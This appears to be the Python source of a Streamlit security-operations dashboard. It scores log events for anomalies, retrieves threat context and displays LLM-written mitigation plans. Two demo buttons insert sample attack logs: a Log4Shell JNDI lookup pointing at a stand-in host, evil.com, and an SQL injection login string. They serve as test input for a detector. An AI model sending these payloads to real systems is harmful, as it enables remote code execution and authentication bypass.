import streamlit as st
import sys
import os
import time
from datetime import datetime
from rag_pipeline.llm_mitigator import LLMMitigator

mitigator = LLMMitigator()


# Path Hack to see sibling folders
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from anomaly_detection.anomaly_scorer import AnomalyScorer
from rag_pipeline.rag_engine import RAGEngine
from evaluation.metrics_calc import compute_live_metrics

# --- INIT SUBSYSTEMS ---
scorer = AnomalyScorer()
rag = RAGEngine()

# --- PAGE CONFIG ---
st.set_page_config(page_title="SOC Architect | AI RAG", page_icon="🛡️", layout="wide")

# --- SESSION STATE (The Database) ---
if 'alerts' not in st.session_state: st.session_state['alerts'] = []
if 'history' not in st.session_state: st.session_state['history'] = []

# --- SIDEBAR: INGESTION ---
with st.sidebar:
    st.header("⚡ Live Data Ingestion")
    st.info("Inject logs to trigger Anomaly Detection -> RAG Pipeline.")
    
    # Simulation Buttons
    cols = st.columns(2)
    if cols[0].button("🔥 Log4Shell"):
        st.session_state['last_log'] = f"{datetime.now().strftime('%H:%M:%S')} GET /?x=${{jndi:ldap://evil.com/exploit}} HTTP/1.1"
    if cols[1].button("💉 SQL Injection"):
        st.session_state['last_log'] = f"{datetime.now().strftime('%H:%M:%S')} POST /login user=admin' OR 1=1;--"
        
    log_input = st.text_area("Raw Log Stream", value=st.session_state.get('last_log', ""))
    
    if st.button("🚀 Process Log Event", type="primary"):
        # 1. Anomaly Detection Stage
        analysis = scorer.analyze(log_input)
        
        # 2. RAG Enrichment Stage (Vector Search)
        rag_context = rag.retrieve_context(
    log_input,
    detected_patterns=analysis['patterns']
)

        
        # 3. Create Alert Object
        new_alert = {
            "id": len(st.session_state['alerts']) + 1000,
            "timestamp": datetime.now().strftime('%H:%M:%S'),
            "raw_log": log_input,
            "score": analysis['score'],
            "severity": analysis['severity'],
            "patterns": analysis['patterns'],
            "context": rag_context # Can be None if no match
        }
        
        st.session_state['alerts'].append(new_alert)
        st.toast(f"Alert Processed: {analysis['severity']}")

# --- MAIN DASHBOARD ---
st.title("🛡️ Enterprise SOC | AI Threat Prioritizer")

# Metrics Display
metrics = compute_live_metrics(st.session_state['history'])
m1, m2, m3 = st.columns(3)
m1.metric("Active Critical Threats", len([a for a in st.session_state['alerts'] if a['severity'] == 'Critical']))
m2.metric("Mitigation Velocity", metrics['response_time'])
m3.metric("Total Mitigated", metrics['mitigation_count'])

st.divider()

# --- DYNAMIC PRIORITY QUEUE ---
st.subheader("🚨 Real-Time Threat Queue")

if not st.session_state['alerts']:
    st.info("✅ System Clean. Waiting for telemetry...")
else:
    # SORT: Critical First
    sorted_alerts = sorted(st.session_state['alerts'], key=lambda x: x['score'], reverse=True)
    
    # Only show Top 3
    for alert in sorted_alerts[:3]:
        
        # Visual cues for severity
        color = "red" if alert['score'] > 80 else "orange" if alert['score'] > 50 else "green"
        
        with st.expander(f"🔴 [{alert['severity']}] Score: {alert['score']} | {alert['timestamp']}", expanded=True):
            
            c1, c2 = st.columns([1, 1])
            
            # LEFT: Analysis
            with c1:
                st.markdown("**🔍 Anomaly Detection**")
                st.code(alert['raw_log'], language='http')
                st.write(f"**Patterns Detected:** {alert['patterns']}")
                
                # DIAGRAM TRIGGER
                if "SQL" in str(alert['patterns']):
                    st.caption("") 
                elif "jndi" in str(alert['patterns']):
                     st.caption("")
            
            # RIGHT: RAG & Mitigation
            with c2:
                st.markdown("**🧠 Knowledge Graph Retrieval**")
                
                if alert['context']:
                    ctx = alert['context']
                    st.success(f"**Matched Threat:** {ctx['vuln_name']} ({ctx['id']})")
                    llm_output = mitigator.generate_mitigation(alert, ctx)

                    st.markdown("**🛠️ LLM-Generated Mitigation Plan**")
                    st.write(llm_output["llm_mitigation"])

                    st.markdown("**📚 Citations**")
                    for c in llm_output["citations"]:
                        st.caption(f"🔗 {c}")

                    st.caption(f"🔗 **Source Citation:** {ctx['citation']}")
                    st.caption(f"🤖 **Retrieval Confidence:** {ctx['confidence_score']}%")
                    
                    if st.button(f"✅ Execute Mitigation #{alert['id']}", key=f"btn_{alert['id']}"):
                        st.session_state['history'].append(alert)
                        st.session_state['alerts'].remove(alert)
                        st.rerun()
                else:
                    st.warning("⚠️ No confident match in Knowledge Base.")
                    st.markdown("**Recommended Action:** Manual Triage Required.")